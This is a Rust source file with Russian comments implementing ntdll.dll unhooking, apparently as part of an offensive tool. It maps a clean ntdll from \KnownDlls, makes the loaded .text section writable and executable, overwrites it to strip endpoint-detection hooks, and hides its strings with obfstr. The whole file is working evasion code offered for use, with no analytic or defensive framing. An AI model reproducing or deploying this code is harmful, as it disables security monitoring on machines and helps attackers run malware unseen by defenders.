// src/edr/unhook.rs

use ntapi::ntmmapi::{NtMapViewOfSection, NtOpenSection, NtProtectVirtualMemory};  // Работа с разделами и защитой памяти[1]
use ntapi::ntpsapi::NtCurrentProcess;                                            // Хэндл текущего процесса[2]
use ntapi::ntrtl::RtlInitUnicodeString;                                           // Инициализация UNICODE_STRING[3]
use winapi::um::winnt::{
    PAGE_EXECUTE_READ,
    PAGE_EXECUTE_READWRITE,
    SECTION_MAP_EXECUTE,
    SECTION_MAP_READ,
    SECTION_QUERY,
};
use winapi::um::libloaderapi::GetModuleHandleA;                                   // Загрузка base address ntdll.dll[4]
use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, UNICODE_STRING, PVOID, HANDLE};     // Структуры Windows API[5]
use winapi::ctypes::c_void;                                                       // Тип c_void из winapi[6]
use std::ptr;
use std::mem::{size_of, zeroed};
use std::ffi::CString;
use obfstr::obfstr;

/// Логирование ключевых событий для диагностики
macro_rules! log_info {
    ($($arg:tt)*) => {
        println!("[EDR][INFO] {}", format!($($arg)*));
    };
}

/// Основная функция удаления inline-хуков в ntdll.dll
pub fn unhook_ntdll() -> Result<(), String> {
    log_info!("Starting ntdll unhooking process");                          // Начало операции[7]

    // Шаг 1: отображаем «чистую» копию ntdll.dll из \KnownDlls
    let (clean_base, view_size) = map_known_dll(obfstr!(r"\KnownDlls\ntdll.dll"))?;
    log_info!("Mapped clean ntdll.dll at {:p}, size {}", clean_base, view_size);

    // Шаг 2: находим .text-секцию в загруженной библиотеке
    let (module_base, (vaddr, rdata)) = find_text_section()?;
    log_info!("Found .text section at 0x{:X} length {}", vaddr, rdata);

    // Шаг 3: патчим .text-секцию оригинальными байтами
    patch_section(module_base, clean_base, vaddr, rdata, view_size)?;
    log_info!("unhook_ntdll completed successfully");
    Ok(())
}

/// Отображение раздела KnownDlls: возврат base pointer и размера view
fn map_known_dll(path: &str) -> Result<(*mut u8, usize), String> {
    unsafe {
        // Инициализируем UNICODE_STRING
        let mut us: UNICODE_STRING = zeroed();
        let wide: Vec<u16> = path.encode_utf16().chain(Some(0)).collect();
        RtlInitUnicodeString(&mut us, wide.as_ptr());

        // Заполняем OBJECT_ATTRIBUTES
        let mut oa: OBJECT_ATTRIBUTES = zeroed();
        oa.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
        oa.ObjectName = &mut us;
        oa.Attributes = 0x00000040;  // OBJ_CASE_INSENSITIVE

        // Открываем секцию
        let mut sec: HANDLE = ptr::null_mut();
        let status = NtOpenSection(
            &mut sec,
            SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
            &mut oa,
        );
        if status < 0 {
            return Err(format!("NtOpenSection failed: 0x{:X}", status));
        }

        // Маппим секцию в память
        let mut base: PVOID = ptr::null_mut();
        let mut size: usize = 0;
        let status = NtMapViewOfSection(
            sec,
            NtCurrentProcess,
            &mut base,
            0,
            0,
            ptr::null_mut(),
            &mut size,
            1, // ViewShare
            0,
            PAGE_EXECUTE_READ,
        );
        if status < 0 {
            return Err(format!("NtMapViewOfSection failed: 0x{:X}", status));
        }
        Ok((base as *mut u8, size))
    }
}

/// Поиск виртуального адреса и размера .text-секции ntdll.dll
fn find_text_section() -> Result<(*mut u8, (usize, usize)), String> {
    unsafe {
        // Загружаем базовый адрес загруженной ntdll.dll
        let module = GetModuleHandleA(
            CString::new(obfstr!("ntdll.dll")).unwrap().as_ptr()
        );
        if module.is_null() {
            return Err(obfstr!("GetModuleHandleA failed").into());
        }
        let base = module as usize;

        // Читаем PE заголовки
        let dos = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
        let nt = (base + (*dos).e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
        let secs = (nt as usize + size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>()) 
            as *const winapi::um::winnt::IMAGE_SECTION_HEADER;

        // Ищем секцию ".text"
        for i in 0..(*nt).FileHeader.NumberOfSections {
            let hdr = &*secs.add(i as usize);
            if &hdr.Name[..5] == obfstr!(".text").as_bytes() {
                return Ok((base as *mut u8, (hdr.VirtualAddress as usize, hdr.SizeOfRawData as usize)));
            }
        }
        Err(obfstr!("No .text section found").into())
    }
}

/// Копирование байтов из clean copy в основной образ с проверкой границ
fn patch_section(
    module_base: *mut u8,
    clean_base: *mut u8,
    vaddr: usize,
    len: usize,
    mapped: usize,
) -> Result<(), String> {
    unsafe {
        // Проверка границ маппинга
        let end = vaddr.checked_add(len)
            .ok_or(obfstr!("Section size overflow"))?;
        if end > mapped {
            return Err(obfstr!("Section exceeds mapped bounds").into());
        }

        // Подготовка указателя для изменения защиты
        let mut base_ptr: *mut c_void = module_base.add(vaddr) as *mut c_void;
        let mut region = len;
        let mut old: u32 = 0;

        log_info!("Changing protection for region at {:p}, size {}", base_ptr, region);
        let st = NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut base_ptr,
            &mut region,
            PAGE_EXECUTE_READWRITE,
            &mut old,
        );
        if st < 0 {
            return Err(format!("Protect failed: 0x{:X}", st));
        }
        log_info!("Protection changed, old=0x{:X}", old);

        // Копирование оригинальных байтов
        ptr::copy_nonoverlapping(clean_base.add(vaddr), module_base.add(vaddr), len);
        log_info!("Copied {} bytes to 0x{:X}", len, module_base as usize + vaddr);

        // Восстановление защиты
        let st2 = NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut base_ptr,
            &mut region,
            old,
            &mut old,
        );
        if st2 < 0 {
            return Err(format!("Restore failed: 0x{:X}", st2));
        }
        log_info!("Protection restored");
        Ok(())
    }
}
